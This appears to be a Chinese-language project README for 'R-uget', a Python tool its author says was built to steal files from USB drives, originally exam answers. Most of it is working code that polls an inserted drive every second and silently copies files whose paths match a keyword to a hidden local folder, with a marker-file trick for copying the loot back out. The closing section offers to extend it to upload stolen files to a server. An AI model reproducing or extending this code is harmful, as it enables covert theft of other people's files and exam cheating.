# R-uget
 旧项目，用于获取u盘信息（窃取u盘信息），本是用来窃取考试答案的，但未能实施，奉劝各位不要做这种事（

 python3.9, pyside2
# 主要原理
 通过pyside2生成系统托盘，相当于启动器

 再制作一个程序重复获取u盘内存在的文件并将特定文件存储到相应的位置
 
 代码：
```python
from shutil import copyfile
from os.path import abspath, isdir
from os import listdir
from sys import exit
from time import sleep


def finding(file_first=f"{abspath('..')}"):
    files = listdir(file_first)
    files_ = [f"{file_first}\\{file}" for file in files]

    for file_sub in files:
        if isdir(f"{file_first}\\{file_sub}"):
            files_sub = finding(f"{file_first}\\{file_sub}")
            if files_sub:
                files_ = files_ + files_sub
    if files_:
        return files_
    else:
        return None


def find_u():
    while True:
        with open("b", "r") as r:
            if r.read() == "1":
                exit()
        with open("p", "r") as r:
            p = r.read()
        with open("m", "r") as r:
            m = r.read()
        try:
            with open("a", "r") as r:
                f = r.read().split("\n")
            finding_list = finding(p+"\\")
            d = finding("D:\\Liu\\uget\\")

            if p+"\\\\qweasd.e" in finding_list:
                for i in d:
                    if not i in f:
                        a = i.split("\\")[-1]
                        copyfile(i, p+f"\\Liu\\uget\\{a}")
                        f.append(i)
                        with open("a", "a") as w:
                            w.write("\n"+i)
            else:
                for i in finding_list:
                    if m in i and not i in f:
                        a = i.split("\\")[-1]
                        copyfile(i, f"D:\\Liu\\uget\\{a}")
                        f.append(i)
                        with open("a", "a") as w:
                            w.write("\n"+i)
            sleep(1)
        except:
            pass
if __name__ == "__main__":
    find_u()
 ```

 托盘触发u盘获取程序（通过更改文本文件内的内容，读取程序发现文本文件内容更改时运行，主要是制作这个项目时还不会多进程）
# 后续
 如果有人需要可以再更改，把存文件存储到服务器